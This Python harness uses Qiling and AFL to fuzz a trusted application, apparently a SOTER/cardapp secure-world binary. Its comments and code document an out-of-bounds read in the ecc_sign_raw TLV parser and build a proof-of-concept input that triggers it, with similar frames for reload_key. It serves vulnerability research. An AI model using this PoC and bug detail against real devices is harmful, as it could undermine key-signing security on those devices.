#from params import *
from .params import *
from pwn import *
from qiling import Qiling
import struct, os

# === F2 cardapp/SOTER structure-aware harness (staged lapis build) =========
# Target: 86f623f6-a299-4dfd-b560ffd3e5a62c29.ta (staged, sha 62c09a90…; LAPIS build).
# Real dispatcher @0x25A78 (re-derived from the staged .ta):
#   gate: paramTypes==0x65 (params[0]=MEMREF_INPUT, params[1]=MEMREF_OUTPUT).
#   public path requires params[0].size==0x1008 AND params[1].size==0x1008 AND
#     *(u32*)(IN)==3 (proto v3); handlers get x0=params[0].buf, x1=params[1].buf.
#
# PRIMARY TARGET: cmd 0x300 ecc_sign_raw TLV parser @0x23220 (OOB READ).
#   body_len = *(u32*)(IN+4)            (attacker u32, NEVER bounded vs 0x1008)
#   walk: tag=ldr[IN+8+off]; len=ldr[IN+12+off]; off += 8; then
#         if value_len > body_len-off -> err;  off += value_len  (unknown tag path)
#   guards are all vs body_len, not vs the 0x1008 param size => set body_len large,
#   advance off past 0x1008 with one unknown-tag record, next tag read at IN+0x1010
#   walks off the redzoned 0x1008 param buffer => asan OOB read.
#
# Mode select via MODE env (default 0x300):
#   MODE=300  -> ecc_sign_raw OOB-read PoC (deterministic) + AFL sweep of body_len/lens
#   MODE=fuzz -> sweep all REE-facing public cmds + body structure (broad hunt)

PTYPES = 0x65
INSZ   = 0x1008    # public path requires params[0].size==0x1008
OUTSZ  = 0x1008    # params[1].size==0x1008

MODE = os.environ.get("MODE", "300")

# ---- deterministic 0x300 ecc_sign_raw OOB-read frame -------------------------
# IN layout the parser reads:
#   IN[0]   = proto version (must==3 for public path)   -> dispatcher gate
#   IN[4]   = body_len (u32)                              -> TLV walk bound (attacker)
#   IN[8..] = TLV body: [u32 tag][u32 len][len bytes]...
# The parser reads tag/len with `ldr w0,[ptr]` (native-endian LE u32).
P0300_BODYLEN = int(os.environ.get("F2_BODYLEN", str(0x8000)), 0) & 0xFFFFFFFF
P0300_TAG     = int(os.environ.get("F2_TAG", "0xdead"), 0) & 0xFFFFFFFF  # unknown tag
P0300_VLEN    = int(os.environ.get("F2_VLEN", str(0x1000)), 0) & 0xFFFFFFFF

def _build_300(body_len, tag, vlen):
    # header: proto v3 @0, body_len @4
    buf = struct.pack("<I", 3) + struct.pack("<I", body_len)
    # one TLV record at off 0 of the body (IN+8): tag, len, then value bytes
    buf += struct.pack("<I", tag) + struct.pack("<I", vlen)
    # value bytes present only up to what fits in the 0x1008 param buffer; the bug is
    # the parser walking PAST the buffer regardless of real content.
    buf = buf[:INSZ].ljust(INSZ, b"\x41")
    return buf

# REE-facing public cmd ids for the broad sweep (avoid 0xFFxx peer/ACL range)
SWEEP_CMDS = [0x0, 0x102, 0x300, 0x2114, 0x8001, 0x8003, 0xb000, 0xb001, 0xf002, 0xf600]

def _build_f600(body_len, tag, vlen):
    # reload_key (0xf600) @0x27040 reads len=[IN+4], then parses a TLV stream at IN+8
    # via sub_2a370/sub_2a3c0; same body_len-bounded-only walk as cmd 0x300. The TLV
    # record fields are big-endian here (ldrb x0[4..7] assembled MSB-first in sub_2a3c0).
    buf = struct.pack("<I", 3) + struct.pack("<I", body_len)   # proto v3 @0, body_len @4
    buf += struct.pack(">I", tag) + struct.pack(">I", vlen)    # TLV: tag, len (big-endian)
    buf = buf[:INSZ].ljust(INSZ, b"\x41")
    return buf

def place_input_callback(ql: Qiling, input: bytes, _: int):
    if MODE == "f600":
        body_len = int(os.environ.get("F2_BODYLEN", str(0x8000)), 0) & 0xFFFFFFFF
        tag = int(os.environ.get("F2_TAG", "0xdead"), 0) & 0xFFFFFFFF
        vlen = int(os.environ.get("F2_VLEN", str(0x1000)), 0) & 0xFFFFFFFF
        buf = _build_f600(body_len, tag, vlen)
        print(f"[F2-f600] cmd=0xf600 reload_key body_len={body_len:#x} tag={tag:#x} vlen={vlen:#x}")
        params = [MemRefParam(buf, INSZ), MemRefParam(bytes(OUTSZ), OUTSZ),
                  NoneParam(), NoneParam()]
        setup_params_fuzz(ql, 0xf600, PTYPES, params)
        return True

    if MODE == "fuzz":
        if len(input) < 4:
            return False
        cmd = SWEEP_CMDS[input[0] % len(SWEEP_CMDS)]
        # always set proto v3 at IN[0]; let AFL drive body_len@4 + the rest
        body = input[1:]
        buf = struct.pack("<I", 3) + body
        buf = buf[:INSZ].ljust(INSZ, b"\x00")
        print(f"[F2-fuzz] cmd={cmd:#x} body_len@4={struct.unpack_from('<I', buf, 4)[0]:#x}")
        params = [MemRefParam(buf, INSZ), MemRefParam(bytes(OUTSZ), OUTSZ),
                  NoneParam(), NoneParam()]
        setup_params_fuzz(ql, cmd, PTYPES, params)
        return True

    # MODE == "300": ecc_sign_raw OOB-read
    body_len = P0300_BODYLEN
    tag = P0300_TAG
    vlen = P0300_VLEN
    if len(input) >= 4 and "F2_BODYLEN" not in os.environ:
        # AFL explores body_len / vlen around the 0x1008 boundary
        body_len = 0x1008 + (struct.unpack_from("<I", input, 0)[0] % 0x10000)
        if len(input) >= 8:
            vlen = struct.unpack_from("<I", input, 4)[0] & 0xFFFF
    buf = _build_300(body_len, tag, vlen)
    print(f"[F2-300] cmd=0x300 ecc_sign_raw body_len={body_len:#x} tag={tag:#x} vlen={vlen:#x} "
          f"(walk past {INSZ:#x} param buf -> OOB read)")
    params = [
        MemRefParam(buf, INSZ),            # params[0] MEMREF_INPUT (redzoned)
        MemRefParam(bytes(OUTSZ), OUTSZ),  # params[1] MEMREF_OUTPUT (redzoned)
        NoneParam(),
        NoneParam(),
    ]
    setup_params_fuzz(ql, 0x300, PTYPES, params)
    return True
